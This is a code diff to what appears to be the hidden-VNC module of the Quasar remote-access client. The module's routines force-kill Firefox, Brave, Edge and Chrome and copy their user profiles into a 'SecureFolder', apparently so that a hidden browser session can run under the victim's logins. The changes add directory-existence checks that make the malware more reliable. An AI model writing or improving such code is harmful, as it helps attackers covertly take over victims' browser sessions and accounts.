@@ -86,7 +86,19 @@ namespace Quasar.Client.Helper.HVNC
         public void StartFirefox()
         {
             string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\";
+
+            if (!Directory.Exists(path))
+            {
+                return;
+            }
+
             string sourceDir = Path.Combine(path, "Profiles");
+
+            if (!Directory.Exists(sourceDir))
+            {
+                return;
+            }
+
             string text = Path.Combine(path, "SecureFolder");
             string filePath = "cmd.exe /c taskkill /IM firefox.exe /F";
             if (!Directory.Exists(text))
@@ -107,7 +119,19 @@ namespace Quasar.Client.Helper.HVNC
         public void StartBrave()
         {
             string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\";
+
+            if (!Directory.Exists(path))
+            {
+                return;
+            }
+
             string sourceDir = Path.Combine(path, "User Data");
+
+            if (!Directory.Exists(sourceDir))
+            {
+                return;
+            }
+
             string secureFolder = Path.Combine(path, "SecureFolder");
             string killCommand = "cmd.exe /c taskkill /IM brave.exe /F";
 
@@ -127,22 +151,27 @@ namespace Quasar.Client.Helper.HVNC
             this.CreateProc(startCommand);
         }
 
-
-
-
-
         public void StartOpera()
         {
             //soon
         }
 
-
-
-
         public void StartEdge()
         {
             string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\";
+
+            if (!Directory.Exists(path))
+            {
+                return;
+            }
+
             string sourceDir = Path.Combine(path, "User Data");
+
+            if (!Directory.Exists(sourceDir))
+            {
+                return;
+            }
+
             string text = Path.Combine(path, "SecureFolder");
             string filePath = "cmd.exe /c taskkill /IM msedge.exe /F";
             if (!Directory.Exists(text))
@@ -166,6 +195,12 @@ namespace Quasar.Client.Helper.HVNC
             try
             {
                 string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\";
+
+                if (!Directory.Exists(path))
+                {
+                    return true;
+                }
+
                 string sourceDir = Path.Combine(path, "User Data");
                 string text = Path.Combine(path, "SecureFolder");
                 string filePath = "cmd.exe /c taskkill /IM chrome.exe /F";
